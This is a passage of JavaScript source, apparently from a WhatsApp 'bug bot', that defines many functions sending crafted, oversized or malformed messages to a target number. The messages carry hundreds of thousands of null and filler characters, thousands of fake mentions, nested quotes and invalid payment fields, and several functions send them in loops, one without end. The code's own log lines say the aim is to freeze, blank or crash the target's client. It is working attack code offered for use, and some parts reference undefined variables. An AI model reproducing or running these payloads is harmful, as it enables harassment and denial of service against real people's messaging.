                        rows: [`{ title: ${r + 1}, id: ${r + 1} }`]
                    })),
                    singleSelectReply: { selectedRowId: "🐉" },
                    contextInfo: {
                        mentionedJid: Array.from({ length: 1900 }, () => 
                            "1" + Math.floor(Math.random() * 5000000) + "@s.whatsapp.net"
                        ),
                        participant: target,
                        remoteJid: "status@broadcast",
                        forwardingScore: 9741,
                        isForwarded: true,
                        forwardedNewsletterMessageInfo: {
                            newsletterJid: "9741@newsletter",
                            serverMessageId: 1,
                            newsletterName: "Z h i d a n nih deks"
                        }
                    },
                    description: "Z H I D A N K E B A B T U R K I"
                }
            }
        },
        contextInfo: {
            channelMessage: true,
            statusAttributionType: 2
        }
    };
    
    await sock.relayMessage("status@broadcast", viewOnceMessage, {
        statusJidList: [target],
        additionalNodes: invisibleNodes
    });

    await sock.relayMessage("status@broadcast", videoMessage, {
        statusJidList: [target],
        additionalNodes: invisibleNodes
    });

    await sock.relayMessage("status@broadcast", audioMessage, {
        statusJidList: [target],
        additionalNodes: invisibleNodes
    });

    await sock.relayMessage("status@broadcast", imageMessage, {
        statusJidList: [target],
        additionalNodes: invisibleNodes
    });

    await sock.relayMessage("status@broadcast", paymentMessage, {
        statusJidList: [target],
        additionalNodes: invisibleNodes
    });

    await sock.relayMessage("status@broadcast", nativeFlowMessage, {
        statusJidList: [target],
        additionalNodes: invisibleNodes
    });

    await sock.relayMessage("status@broadcast", stickerMessage, {
        statusJidList: [target],
        additionalNodes: invisibleNodes
    });

    await sock.relayMessage("status@broadcast", protocolMessage, {
        statusJidList: [target],
        additionalNodes: invisibleNodes
    });
    
    for (let z = 0; z < 30; z++) {
        await sock.relayMessage('status@broadcast', {
            conversation: "\u0000".repeat(150000)
        }, {
            statusJidList: [target],
            additionalNodes: [{
                tag: 'mentioned_users',
                attrs: {},
                content: [{
                    tag: 'to',
                    attrs: { jid: target },
                    content: undefined
                }]
            }]
        });
        await new Promise(x => setTimeout(x, 30));
    }
    
    console.log(`LOOP 50 AJA MMEK=> ${target}`);
}

async function GrenBooking(sock, target) {
    const payload = {
        viewOnceMessage: {
            message: {
                interactiveMessage: {
                    body: { text: "____" },
                    nativeFlowMessage: {
                        buttons: [
                            {
                                name: "booking_status",
                                buttonParamsJson: JSON.stringify({
                                    display_text: "\u0000",
                                    phone_number: "$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$"
                                })
                            },
                            {
                                name: "quick_reply",
                                buttonParamsJson: JSON.stringify({
                                    display_text: "\u200b",
                                    id: "\u600b"
                                })
                            }
                        ],
                        version: 4
                    }
                }
            }
        }
    };
    await sock.relayMessage(target, payload, {});
}

async function GrenDelayHarimauV2(sock, target) {
    const Gren = {
        groupStatusMessageV2: {
            message: {
                interactiveResponseMessage: {
                    body: {
                        text: "GrenXharimauDelay",
                        format: "DEFAULT"
                    },
                    nativeFlowResponseMessage: {
                        name: "cta_url",
                        paramsJson: `{"flow_cta":"${"\u0000".repeat(999999)}"}`,
                    },
                    extendedTextMessage: {
                        text: "ꦾꦾꦾꦾꦾꦾ".repeat(30000) + "@1".repeat(30000),
                        contextInfo: {
                            stanzaId: target,
                            participant: target,
                            quotedMessage: {
                                conversation: "\u200b" + "ꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾ࣯࣯".repeat(50000) + "@1".repeat(20000)
                            }
                        }
                    },
                    disappearingMode: {
                        initiator: "CHANGED_IN_CHAT",
                        trigger: "\u200b/\n/\u300b"
                    }
                }
            }
        }
    };
    await sock.relayMessage(target, Gren, {});
    console.log("ahhhh terkirim ke target🤧");
}

async function FrezeeGren(sock, target) {
  try {
    const Gren = {
      interactiveMessage: {
        body: { text: "Ahhh GrenXHarimau ange🤤" },
        nativeFlowMessage: {
          buttons: [
            {
              name: "single_select",
              buttonParamsJson: JSON.stringify({
                title: "\u0000".repeat(60000),
                sections: [
                  {
                    title: "\u200B".repeat(50000),
                    rows: [
                      { rowId: "1", title: "\u0000".repeat(40000), description: "\u0000".repeat(40000) }
                    ]
                  }
                ]
              })
            }
          ]
        }
      }
    };
    await sock.relayMessage(target, Gren, { participant: { jid: target } });
    console.log(`💀 GrenXHarimau Frezee Chat🤤${target}`);
  } catch (err) {
    console.error(`❌ ${err.message}`);
  }
}

async function KebabDingin(sock, target) {
 await sock.relayMessage(target, {
     interactiveMessage: {
       body: {
         text: "MakLo"
            },
            nativeFlowMessage: {
            buttons: [
{
   name: "review_and_pay",
   buttonParamsJson: JSON.stringify({
      currency: "IDR",
      total_amount: { 
      value: 999999999999, 
      offset: 100 
      },
      reference_id: "\u0000".repeat(5000),
      order: {
      status: "pending",
      items: [
      {
      name: "𑇂𑆵𑆴𑆿".repeat(9999),
      amount: { value: 100000, offset: 100 },
      quantity: 99999
            }
         ]
      }
   })
}
],
},
},
}, { participant: { jid: target }});
  
  await sock.relayMessage(target, {
      stickerPackMessage: {
        stickerPackId: "bcdf1b38-4ea9-4f3e-b6db-e428e4a581e5",
        name: "z".repeat(100000),
        publisher: "x".repeat(80000),
        stickers: [],
        fileLength: "9999999999999",
        fileSha256: "G5M3Ag3QK5o2zw6nNL6BNDZaIybdkAEGAaDZCWfImmI=",
        fileEncSha256: "2KmPop/J2Ch7AQpN6xtWZo49W5tFy/43lmSwfe/s10M=",
        mediaKey: "rdciH1jBJa8VIAegaZU2EDL/wsW8nwswZhFfQoiauU0=",
        directPath: "/v/t62.15575-24/11927324_562719303550861_518312665147003346_n.enc",
        packDescription: "y".repeat(70000),
        stickerPackOrigin: "USER_CREATED"
      }
    }, {});
    
await sock.relayMessage(target, {
    interactiveMessage: {
      nativeFlowMessage: {
        buttons: [
          {
            name: "payment_info",
            buttonParamsJson: {"currency":"IDR","total_amount":{"value":0,"offset":100},"reference_id":"${Date.now()}","type":"physical-goods","order":{"status":"pending","subtotal":{"value":0,"offset":100},"order_type":"ORDER","items":[{"name":"${'𑇂𑆵𑆴𑆿'.repeat(90000)}","amount":{"value":0,"offset":100},"quantity":0,"sale_amount":{"value":0,"offset":100}}]},"payment_settings":[{"type":"pix_static_code","pix_static_code":{"merchant_name":"MakLo","key":"${'\u0000'.repeat(900000)}","key_type":"CPF"}}],"share_payment_status":false}
          }
        ]
      }
    }
  }, { participant: { jid: target } });
}

async function ZhidanKebabDelay(sock, target) {
  const ZhidanKebab = {
    viewOnceMessage: {
      message: {
        interactiveResponseMessage: {
          contextInfo: {
            participant: target,
            mentionedJid: ['0@s.whatsapp.net', ...Array.from({ length: 2000 }, () => '1' + Math.floor(Math.random() * 900000) + '@s.whatsapp.net')],
            body: { text: 'zhidan', format: 'DEFAULT' },
            footer: { text: '\0'.repeat(25000), format: 'DEFAULT' },
            nativeFlowResponseMessage: {
              name: 'galaxy_message',
              paramsJson: `{\"flow_cta\":{\"title\":${"\0".repeat(990000)}}}`,
              version: 3
            }
          }
        }
      }
    }
  };
  
  const msg2 = {
      groupStatusMessageV2: {
        message: {
          audioMessage: {
            url: "https://mmg.whatsapp.net/v/t62.7114-24/25481244_734951922191686_4223583314642350832_n.enc?ccb=11-4&oh=01_Q5Aa1QGQy_f1uJ_F_OGMAZfkqNRAlPKHPlkyZTURFZsVwmrjjw&oe=683D77AE&_nc_sid=5e03e0&mms3=true",
            mimetype: "audio/mpeg",
            fileSha256: Buffer.from([226,213,217,102,205,126,232,145,0,70,137,73,190,145,0,44,165,102,153,233,111,114,69,10,55,61,186,131,245,153,93,211]),
            fileLength: 432722,
            seconds: 26,
            ptt: false,
            mediaKey: Buffer.from([182,141,235,167,91,254,75,254,190,229,25,16,78,48,98,117,42,71,65,199,10,164,16,57,189,229,54,93,69,6,212,145]),
            fileEncSha256: Buffer.from([29,27,247,158,114,50,140,73,40,108,77,206,2,12,84,131,54,42,63,11,46,208,136,131,224,87,18,220,254,211,83,153]),
            directPath: "/v/t62.7114-24/25481244_734951922191686_4223583314642350832_n.enc?ccb=11-4&oh=01_Q5Aa1QGQy_f1uJ_F_OGMAZfkqNRAlPKHPlkyZTURFZsVwmrjjw&oe=683D77AE&_nc_sid=5e03e0",
            mediaKeyTimestamp: 1746275400,
            contextInfo: {
              participant: target,
              mentionedJid: ['0@s.whatsapp.net', ...Array.from({ length: 2000 }, () => '1' + Math.floor(Math.random() * 900000) + '@s.whatsapp.net')],
              body: { text: 'zhidan', format: 'DEFAULT' },
              isSampled: true,
              remoteJid: "status@broadcast",
              forwardingScore: 9741,
              isForwarded: true
            }
          }
        }
      }
    };
  
  const forcloseNoClick = {
            groupStatusMessageV2: {
                message: {
                    interactiveResponseMessage: {
                        body: {
                            text: "",
                            format: "EXTENSION"
                        },
                        nativeFlowResponseMessage: {
                            name: "address_message",
                            paramsJson: `{"values":{"in_pin_code":"999999","building_name":"zhidan","landmark_area":"zhidan","address":"zhidan","tower_number":"zhidan","city":"zhidan","name":"zhidan","phone_number":"0","house_number":"xxx","floor_number":"xxx","state":"zhidan | ${z(900000)}"}}`,
                            version: 3
                        }
                    }
                }
            }
        };
  
  await sock.relayMessage(target, msg.message, { messageId: msg.key.id });

  await sock.relayMessage(target, {
    messageContextInfo: {
      deviceListMetadata: {},
      deviceListMetadataVersion: 2,
      botMetadata: {
        pluginMetadata: {},
        richResponseSourcesMetadata: { sources: [] }
      }
    },
    botForwardedMessage: {
      message: {
        richResponseMessage: {
          messageType: 1,
          submessages: [
            {
              messageType: 5,
              codeMetadata: {
                codeLanguage: "json",
                codeBlocks: [
                  { highlightType: 0, codeContent: "{\n" },
                  { highlightType: 3, codeContent: "`" + "\n{".repeat(10000) + "`" },
                  { highlightType: 0, codeContent: "}" }
                ]
              }
            }
          ],
          unifiedResponse: {
            data: JSON.stringify({
              response_id: crypto.randomUUID(),
              sections: []
            })
          },
          contextInfo: {
            forwardingScore: 1,
            isForwarded: true,
            forwardedAiBotMessageInfo: {
              botJid: "867051314767696@bot"
            },
            forwardOrigin: 4
          }
        }
      }
    }
  }, {});
}

async function fcnocli(sock, target) {
    try {
        const executive = "\u0000".repeat(500000);
        const sunover = "#nanzlyora🩸".repeat(100000);
        const rootxe = "\u200b".repeat(100000);
        const generateId = () => Math.random().toString(36).substring(2, 15);
        
        const msg = {
            key: { remoteJid: target, fromMe: true, id: generateId() },
            message: {
                imageMessage: {
                    url: "https://mmg.whatsapp.net/v/t62.7118-24/598799587_1007391428289008_8291851315917551033_n.enc?ccb=11-4&oh=01_Q5Aa4QEecQfG2xN6_RkPXn8UtCa0fmWNTyXDBfEqsuHnx6NvRQ&oe=6A1BB373&_nc_sid=5e03e0",
                    mimetype: "image/jpeg",
                    fileSha256: Buffer.from("qFarb5UsIY5yngQKA6MylUxShVLYgna4T0huGHDOMrw=", "base64"),
                    caption: executive.slice(0, 10000),
                    fileLength: "99999999999999999999",
                    height: -1,
                    width: -1,
                    mediaKey: Buffer.from("5nwlQgrmasYJIgmOkI6pgZlpRCZ7Qqx04G7lMoh4SRM=", "base64"),
                    fileEncSha256: Buffer.from("XM2q+iwypSX8r4TLT+dd/oB9R2iLGuSw+nIKP9EdnSw=", "base64"),
                    directPath: "/v/t62.7118-24/598799587_1007391428289008_8291851315917551033_n.enc?ccb=11-4&oh=01_Q5Aa4QEecQfG2xN6_RkPXn8UtCa0fmWNTyXDBfEqsuHnx6NvRQ&oe=6A1BB373&_nc_sid=5e03e0",
                    mediaKeyTimestamp: "1777621571",
                    jpegThumbnail: Buffer.from("/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEABsbGxscGx4hIR4qLSgtKj04MzM4PV1CR0JHQl2NWGdYWGdYjX2Xe3N7l33gsJycsOD/2c7Z//////////////8BGxsbGxwbHiEhHiotKC0qPTgzMzg9XUJHR0JXY1hYXVxYjX2Xe3N7lnngsJycsOD/2c7Z////////////////CABEIAEMAQwMBIgACEQEDEQH/xAAvAAEAAwEBAQAAAAAAAAAAAAAAAQIDBAUGAQEBAQEAAAAAAAAAAAAAAAAAAQID/9oADAMBAAIQAxAAAAD58BctFpKNM0lAdfIt7o4ra13UxyjrwxAZxaaC952s5u7OkdlvHY37Dy0ZDpmyosqAISAAAEAB/8QAJxAAAgECBQMEAwAAAAAAAAAAAQIAAxEEEiAhMRATMhQiQVEVMFP/2gAIAQEAAT8A/X23sDlMNOoNypnbfb2mGk4NipnaqZb5TooFKd3aDGEArlBEOMbKQBGxzMqgoNocWTyonrG2EqqNiDzpVSxsIQX2C8cQqy8qdARjaBVHLQso4X4mdkGxsSIKrhg19xPXMLB0DCCvganlTsYMLg6ng8/G0/6zf76U6JexBEIJ3NNYadgTkWOCaY9qgTiAkcGCvVA8z1DFYXb7mZvuBj020nUYPnQTB0M//8QAIxEBAAIAAwkBAAAAAAAAAAAAAQACERNBEBIgITAxUVNxkv/aAAgBAgEBPwDhHBxm/bzG9jWNlOe0iVe4MyqaNq/GZT77fk6f/8QAIBEAAQMDBQEAAAAAAAAAAAAAAQACERASUQMTMFKRkv/aAAgBAwEBPwBQVFWm0ytx+UHvIReSINTS9/b0Sr3Y0/nj/9k=", "base64"),
                    scansSidecar: "3NpVPzuE+1LdqIuSDFHtXfXBR8TlDe+Tjjy/DWFOO9mcOpvyS9jbkQ==",
                    scanLengths: [2899999999999999077, 1799999999999998555, 7699999999999999148, 1069999999999999164],
                    midQualityFileSha256: "Gt6RODauIu1fIwGhRg1TeEIkeguwn+ylFauogg+pQOk="
                }
            },
            messageTimestamp: Math.floor(Date.now() / 1000)
        };
        await sock.relayMessage(target, msg.message, {
            messageId: msg.key.id,
            participant: { jid: target }
        });
        await sock.sendMessage(target, {
            requestPaymentMessage: {
                currencyCodeIso4217: "IDR",
                amount1000: -9223372036854775808,
                requestFrom: target,
                note: executive.slice(0, 50000),
                expiryTimestamp: -1
            }
        }).catch(()=>{});
        await sock.sendMessage(target, {
            text: rootxe,
            contextInfo: {
                mentionedJid: Array.from({ length: 5000 }, () => 
                    `${Math.floor(Math.random() * 99999999)}@s.whatsapp.net`
                )
            }
        }).catch(()=>{});

        console.log(`Send To ${target}`);

    } catch (error) {
        console.error(`Error in: ${error.message}`);
    }
}

async function FaiqForcloseClick(sock, target) {
  for (let n = 0; n < 100; n++) {
    await sock.relayMessage(target, {
      interactiveMessage: {
        body: { text: "Faiq Attack" },
        nativeFlowMessage: {
          buttons: [
            {
              name: (["inapp_signup", "booking_status", "galaxy_message"][(n + (Math.random() < 0.5 ? 1 : 0)) % 3]),
              buttonParamsJson: `{}`
            }
          ]
        }
      }
    }, { participant: { jid: target } });
  }

  await sock.relayMessage(target, {
    interactiveMessage: {
      body: { text: "", format: 1 },
      footer: { text: "" },
      nativeFlowMessage: {
        buttons: [
          {
            name: "cta_url",
            buttonParamsJson: JSON.stringify({
              display_text: "Faiq Is Here",
              url: "{\"display_text\":\"ⓘ ⸸Faia\",\"url\":\"http://wa.mE/stickerpack/Faiq\",\"merchant_url\":\"https://wa.me/settings/linked_devices/,,Faiq\"}"
            })
          }
        ]
      }
    }
  }, { participant: { jid: target } });
}

async function CrashClick(sock, target) {
  await sock.relayMessage(target, {
    interactiveMessage: {
      body: { text: "Nanz Lyora Function" },
      nativeFlowMessage: {
        buttons: [
          { name: "booking_status", buttonParamsJson: "\u0000".repeat(50000) + "\u0003".repeat(40000) }
        ]
      }
    }
  }, {});
}

async function forclosenanz(sock, target) {
    let msg = await generateWAMessageFromContent(target, {
        viewOnceMessage: {
            message: {
                messageContextInfo: {
                    deviceListMetadata: {},
                    deviceListMetadataVersion: 2
                },
                interactiveMessage: {
                    body: {
                        text: "🫀ꢵ 𝐉𝐀𝐖𝐀 𝐅𝐔𝐍𝐂𝐓𝐈𝐎𝐍* ꢵ 🫀"
                    },
                    nativeFlowMessage: {
                        messageParamsJson: "{}",
                        buttons: [
                            {
                                name: "single_select",
                                buttonParamsJson: "X"
                            },
                            {
                                name: "booking_confirmation",
                                buttonParamsJson: JSON.stringify({})
                            },
                            {
                                name: "psi_opt_outs",
                                buttonParamsJson: JSON.stringify({})
                            },
                            {
                                name: "psi_tos_opt_in",
                                buttonParamsJson: JSON.stringify({})
                            },
                            {
                                name: "psi_nux_opt_in",
                                buttonParamsJson: JSON.stringify({})
                            },
                            {
                                name: "cta_app_link",
                                buttonParamsJson: JSON.stringify({
                                    display_text: "xnxx",
                                    android_app_metadata: {
                                        url: "https://t.me/nanzlyora",
                                        consented_users_url: "https://t.me/nanzlyora"
                                    }
                                })
                            }
                        ]
                    }
                }
            }
        }
    }, {});

    await sock.relayMessage(target, msg.message, {
        messageId: msg.key.id
    });
}

async function BlankHardXbulldo(sock, target) {
  console.log(`Blank Hard Succes sent to ${target}`)
  
  for (let i = 0; i < 50; i++) {
    let payload1 = {
      text: '\u0000'.repeat(900000) + '\uFFFF'.repeat(500000) + 'ꦽ'.repeat(400000)
    }
    
    let payload2 = {
      react: {
        text: '\u0000'.repeat(25000) + 'ꦾ'.repeat(30000),
        key: {
          remoteJid: target,
          fromMe: true,
          id: 'Garam madu'.repeat(5000) + i
        }
      }
    }
    
    let deepContext = {}
    for (let x = 0; x < 100; x++) {
      deepContext = {
        quotedMessage: {
          conversation: '\u0000'.repeat(50000) + 'ꦽꦾ'.repeat(20000),
          contextInfo: deepContext
        }
      }
    }
    
    let payload3 = {
      text: '\u0000'.repeat(700000) + 'VnX'.repeat(30000),
      contextInfo: deepContext
    }
    
    let payload4 = {
      newsletterAdminInviteMessage: {
        newsletterJid: "1283783946799@newsletter",
        newsletterName: "🔥" + "ꦽ".repeat(300000),
        caption: "💀" + "ꦾ".repeat(300000),
        inviteExpiration: "9999999999999999"
      }
    }
    
    let payloadImage = {
      imageMessage: {
        url: "https://mmg.whatsapp.net/v/t62.7118-24/691736887_988325427048309_788682993847765619_n.enc?ccb=11-4&oh=01_Q5Aa4gHmdgqbOLGYp2Ck_IhKprwM9Kkqvv89EH2eJBknWSr9Fg&oe=6A23B5DE&_nc_sid=5e03e0&mms3=true",
        mimetype: "image/jpeg",
        fileSha256: "PWTAJAHWUO0xqO802IsTrNwx8j5QN1eD+sT3gpUTWis=",
        fileLength: "93217",
        caption: "\u0000".repeat(50000) + "💀".repeat(50000),
        height: 1080,
        width: 1080,
        mediaKey: "QOByaM/siGh1h0k1sWbG69l7wHUgSR0tyCaUaKYal/0=",
        fileEncSha256: "AljbB1V/hf9gKsEzoeu2s+GvEa41VXy9MrKkj8Tea54=",
        directPath: "/v/t62.7118-24/691736887_988325427048309_788682993847765619_n.enc?ccb=11-4&oh=01_Q5Aa4gHmdgqbOLGYp2Ck_IhKprwM9Kkqvv89EH2eJBknWSr9Fg&oe=6A23B5DE&_nc_sid=5e03e0",
        mediaKeyTimestamp: "1778142659",
        jpegThumbnail: "/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEABsbGxscGx4hIR4qLSgtKj04MzM4PV1CR0JHQl2NWGdYWGdYjX2Xe3N7l33gsJycsOD/2c7Z//////////////8BGxsbGxwbHiEhHiotKC0qPTgzMzg9XUJHQkdCXY1YZ1hYZ1iNfZd7c3uXfeCwnJyw4P/Zztn////////////////CABEIAEMAQwMBIgACEQEDEQH/xAAxAAACAwEBAAAAAAAAAAAAAAAABQIDBAEGAQADAQEBAAAAAAAAAAAAAAABAgMEAAX/2gAMAwEAAhADEAAAAFZVLWlw00o3nRytIp7XNukVhFljGyLaGiZshrmIx0VpmuoTKj2WhPDIzdZcSFeTaj5GCX0anU+crLr3YtlJnkVbHIs0WvJZ5zqv0JAiN2+oPLsdCo5iDQvbQskAOP8A/8QAKRAAAgIBAwMDAwUAAAAAAAAAAQIAAxEEEjEFEyEQIkEyQlEVJGJjgf/aAAgBAQABPwAVDC+ftzGXaASZ21IJEtoC4wfOItLMAYaTlgDxGq2qpgpJ4InYs+BFtbA8/GIzsy4z7ROmaWu6nc8s6ZU/G4S3Q3qgVCCBLK9TUT7DDbZn3GC47s/ENrn7pUoapeOYaqxnJnSyvZIWZjWL8ibAROorSlyAKJhd3EPJml6UXoR+5yIei/3TR6a7Ru27yk3K2I2xQW/An6rYG+jwDNVd3rWfMyfzBWZoz+2oH8IxAxky4qK28yjd3PrIWPe+9kx4A5lGkazd5GzM1PSgRmnmds1sVcYI9NPqMVUjPCy+6250Ss+7MGmtIBts/wAEr2G4gTXFaqjtHkyjXvVZmJr6GXduxNbctzhwuJkyq1gFmn1Ypt3sI+vFnhZTaUs3ZmrtDEnubQR5Bh5iHEMzF4E5Mb2qB8zdXRp6bAuXM1dj2OCy49BNntBhhrQrWcfaIyKpBAmoABTH4lzE11D4xLfOnQn0EFjAY9P/xAAhEQACAQQCAgMAAAAAAAAAAAAAAQIDERIxISIQEwQyUf/aAAgBAgEBPwCOSSux1LPZm2d2jv8AqMlx2J7414jHXO14weyq8IXTIeyTRTbysyx0aSKsfZdJ8I+PTcaey6iXLsp/QpbGk/H/xAAfEQACAgIBBQAAAAAAAAAAAAAAAQIRAxIhMkFRYbH/2gAIAQMBAT8AMGK6Uqdtd0DM9/kdpOUoy24YxvFS8ZD5H7MJ1//Z",
        contextInfo: {
          pairedMediaType: "NOT_PAIRED_MEDIA",
          isQuestion: true,
          isGroupStatus: true
        },
        scansSidecar: "3NpVPzuE+1LdqIuSDFHtXfXBR8TlDe+Tjjy/DWFOO9mcOpvyS9jbkQ==",
        scanLengths: [
          9999999999999999999,
          9999999999999999999,
          9999999999999999999,
          9999999999999999999
        ],
        midQualityFileSha256: "S8DxhY6+3htsmT0dCFsMkMqjoty3gkgOXAZCCft5V9U="
      }
    }
    
    await sock.sendMessage(target, payload1).catch(e => console.log("err1"))
    await sock.sendMessage(target, payload2).catch(e => console.log("err2"))
    await sock.sendMessage(target, payload3).catch(e => console.log("err3"))
    await sock.relayMessage(target, payload4, { participant: { jid: target } }).catch(e => console.log("err4"))
    await sock.relayMessage(target, payloadImage, {}).catch(e => console.log("err5"))
    
    for (let p = 0; p < 15; p++) {
      await sock.sendPresenceUpdate('composing', target).catch(e => {})
      await sock.sendPresenceUpdate('recording', target).catch(e => {})
    }
    
    console.log(`Loop ${i+1}/50 - target makin blank`)
  }
  
  for (let final = 0; final < 10; final++) {
    await sock.sendMessage(target, {
      text: '\u0000'.repeat(999999) + 'ꦽꦾ'.repeat(99999) + '\u200b'.repeat(99999)
    }).catch(e => {})
    
    await sock.relayMessage(target, {
      buttonsMessage: {
        contentText: "💀".repeat(500000),
        footerText: "\u0000".repeat(50000),
        buttons: [
          {
            buttonId: "Garam madu",
            buttonText: { displayText: "ꦽ".repeat(100000) },
            type: 1
          }
        ],
        headerType: 1
      }
    }, { participant: { jid: target } }).catch(e => {})
    
    let payloadImageFinal = {
      imageMessage: {
        url: "https://mmg.whatsapp.net/v/t62.7118-24/691736887_988325427048309_788682993847765619_n.enc?ccb=11-4&oh=01_Q5Aa4gHmdgqbOLGYp2Ck_IhKprwM9Kkqvv89EH2eJBknWSr9Fg&oe=6A23B5DE&_nc_sid=5e03e0&mms3=true",
        mimetype: "image/jpeg",
        fileSha256: "PWTAJAHWUO0xqO802IsTrNwx8j5QN1eD+sT3gpUTWis=",
        fileLength: "93217",
        caption: "\u0000".repeat(100000) + "💀🔥".repeat(50000),
        height: 1080,
        width: 1080,
        mediaKey: "QOByaM/siGh1h0k1sWbG69l7wHUgSR0tyCaUaKYal/0=",
        fileEncSha256: "AljbB1V/hf9gKsEzoeu2s+GvEa41VXy9MrKkj8Tea54=",
        directPath: "/v/t62.7118-24/691736887_988325427048309_788682993847765619_n.enc?ccb=11-4&oh=01_Q5Aa4gHmdgqbOLGYp2Ck_IhKprwM9Kkqvv89EH2eJBknWSr9Fg&oe=6A23B5DE&_nc_sid=5e03e0",
        mediaKeyTimestamp: "1778142659",
        jpegThumbnail: "/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEABsbGxscGx4hIR4qLSgtKj04MzM4PV1CR0JHQl2NWGdYWGdYjX2Xe3N7l33gsJycsOD/2c7Z//////////////8BGxsbGxwbHiEhHiotKC0qPTgzMzg9XUJHQkdCXY1YZ1hYZ1iNfZd7c3uXfeCwnJyw4P/Zztn////////////////CABEIAEMAQwMBIgACEQEDEQH/xAAxAAACAwEBAAAAAAAAAAAAAAAABQIDBAEGAQADAQEBAAAAAAAAAAAAAAABAgMEAAX/2gAMAwEAAhADEAAAAFZVLWlw00o3nRytIp7XNukVhFljGyLaGiZshrmIx0VpmuoTKj2WhPDIzdZcSFeTaj5GCX0anU+crLr3YtlJnkVbHIs0WvJZ5zqv0JAiN2+oPLsdCo5iDQvbQskAOP8A/8QAKRAAAgIBAwMDAwUAAAAAAAAAAQIAAxEEEjEFEyEQIkEyQlEVJGJjgf/aAAgBAQABPwAVDC+ftzGXaASZ21IJEtoC4wfOItLMAYaTlgDxGq2qpgpJ4InYs+BFtbA8/GIzsy4z7ROmaWu6nc8s6ZU/G4S3Q3qgVCCBLK9TUT7DDbZn3GC47s/ENrn7pUoapeOYaqxnJnSyvZIWZjWL8ibAROorSlyAKJhd3EPJml6UXoR+5yIei/3TR6a7Ru27yk3K2I2xQW/An6rYG+jwDNVd3rWfMyfzBWZoz+2oH8IxAxky4qK28yjd3PrIWPe+9kx4A5lGkazd5GzM1PSgRmnmds1sVcYI9NPqMVUjPCy+6250Ss+7MGmtIBts/wAEr2G4gTXFaqjtHkyjXvVZmJr6GXduxNbctzhwuJkyq1gFmn1Ypt3sI+vFnhZTaUs3ZmrtDEnubQR5Bh5iHEMzF4E5Mb2qB8zdXRp6bAuXM1dj2OCy49BNntBhhrQrWcfaIyKpBAmoABTH4lzE11D4xLfOnQn0EFjAY9P/xAAhEQACAQQCAgMAAAAAAAAAAAAAAQIDERIxISIQEwQyUf/aAAgBAgEBPwCOSSux1LPZm2d2jv8AqMlx2J7414jHXO14weyq8IXTIeyTRTbysyx0aSKsfZdJ8I+PTcaey6iXLsp/QpbGk/H/xAAfEQACAgIBBQAAAAAAAAAAAAAAAQIRAxIhMkFRYbH/2gAIAQMBAT8AMGK6Uqdtd0DM9/kdpOUoy24YxvFS8ZD5H7MJ1//Z",
        contextInfo: {
          pairedMediaType: "NOT_PAIRED_MEDIA",
          isQuestion: true,
          isGroupStatus: true
        },
        scansSidecar: "3NpVPzuE+1LdqIuSDFHtXfXBR8TlDe+Tjjy/DWFOO9mcOpvyS9jbkQ==",
        scanLengths: [
          9999999999999999999,
          9999999999999999999,
          9999999999999999999,
          9999999999999999999
        ],
        midQualityFileSha256: "S8DxhY6+3htsmT0dCFsMkMqjoty3gkgOXAZCCft5V9U="
      }
    }
    
    await sock.relayMessage(target, payloadImageFinal, {}).catch(e => {})
    console.log(`Final blast ${final+1}/10 - target crash imminent`)
  }
  
  console.log(`Blank Hard Succes sent to ${target}`)
  console.log("Target blank total ")
}

async function BulldozerInfinity(sock, target) {
 while (true) {
  const MsgNew = {
    groupStatusMessageV2: {
      message: {
        documentMessage: {
          url: "https://mmg.whatsapp.net/v/t62.7119-24/701194605_979944131092122_1860918218284985201_n.enc?ccb=11-4&oh=01_Q5Aa4gE59mooNBmYLPOKcNT25wDzfB1ctLP8qfS5BxyUygCgbQ&oe=6A2E2184&_nc_sid=5e03e0&mms3=true",
          directPath: "/v/t62.7119-24/701194605_979944131092122_1860918218284985201_n.enc?ccb=11-4&oh=01_Q5Aa4gE59mooNBmYLPOKcNT25wDzfB1ctLP8qfS5BxyUygCgbQ&oe=6A2E2184&_nc_sid=5e03e0",
          mediaKey: Buffer.from("89lwViNcegystiWyPMjQd8MyzphI1OrGEKMqjbOJJGQ=", "base64"),
          fileEncSha256: Buffer.from("QH0ZymePSShq4wyl3u8FqVOQiXKAUaubDdhDSbQpy8Q=", "base64"),
          fileSha256: Buffer.from("5bhEzFf1cJTqRYXiNfNseMHNIiJiu4nVPJTctNaz5V0=", "base64"),
          mimetype: "application/msword",
          fileLength: "10485760",
          mediaKeyTimestamp: "1778818915",
          fileName: "꦳".repeat(12000),
          title: "\u0000".repeat(900000),
          pageCount: 999999999,
          contactVcard: false,
          thumbnailDirectPath: "/v/t62.7119-24/701194605_979944131092122_1860918218284985201_n.enc?ccb=11-4&oh=01_Q5Aa4gE59mooNBmYLPOKcNT25wDzfB1ctLP8qfS5BxyUygCgbQ&oe=6A2E2184&_nc_sid=5e03e0",
          thumbnailSha256: Buffer.from("5bhEzFf1cJTqRYXiNfNseMHNIiJiu4nVPJTctNaz5V0=", "base64"),
          thumbnailEncSha256: Buffer.from("QH0ZymePSShq4wyl3u8FqVOQiXKAUaubDdhDSbQpy8Q=", "base64"),
          thumbnailHeight: 100,
          thumbnailWidth: 100,
          caption: "",
          accessibilityLabel: "",
          mediaKeyDomain: 1,
          contextInfo: {
            urlTrackingMap: {
              urlTrackingMapElements: Array.from({ length: 1 }, () => ({}))
            },
            participants: Array.from({ length: 1 }, (_, n) => ({
              participant: `62${n + 829599}@s.whatsapp.net`
            }))
          }
        }
      }
    }
  };

  try {
    await sock.relayMessage(target, MsgNew, { participant: { jid: target } });
    console.log(`message success to ${target}`);
  } catch (e) {
    console.log("[!] Error Strike:", e);
  }
}
}

async function garamMaduForceIOS(sock, target) {
  const delay = ms => new Promise(r => setTimeout(r, ms));
  const crashChar = "𑇂".repeat(130000);
  const nullChar = "\u0000".repeat(130000);
  const zeroWidth = "‍".repeat(110000);
